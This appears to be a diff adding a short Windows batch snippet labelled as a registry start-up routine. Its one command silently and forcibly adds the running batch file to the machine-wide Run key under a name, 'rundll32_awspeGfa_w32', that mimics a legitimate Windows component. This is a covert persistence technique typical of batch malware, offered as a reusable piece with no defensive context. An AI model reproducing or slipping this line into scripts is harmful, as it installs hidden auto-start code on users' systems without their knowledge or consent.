@@ -1,0 +1,4 @@
+Registery Start-up: (Current Batchfile Running)
+
+
+reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v "rundll32_awspeGfa_w32" /t "REG_SZ" /d %0 /f > nul
